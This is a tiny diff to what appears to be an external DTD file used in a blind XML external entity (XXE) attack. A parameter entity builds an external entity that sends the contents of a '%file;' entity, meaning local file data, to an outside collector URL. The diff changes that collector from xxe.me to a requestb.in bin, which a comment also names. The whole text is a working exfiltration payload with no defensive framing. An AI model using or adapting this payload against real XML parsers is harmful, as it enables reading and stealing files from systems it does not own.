@@ -1,4 +1,4 @@
 <?xml version="1.0" encoding="UTF-8"?>
 <!--- https://requestb.in/16314fs1 -->
-<!ENTITY % all "<!ENTITY send SYSTEM 'http://xxe.me/content?%file;'>">
+<!ENTITY % all "<!ENTITY send SYSTEM 'http://requestb.in/16314fs1?%file;'>">
 %all;
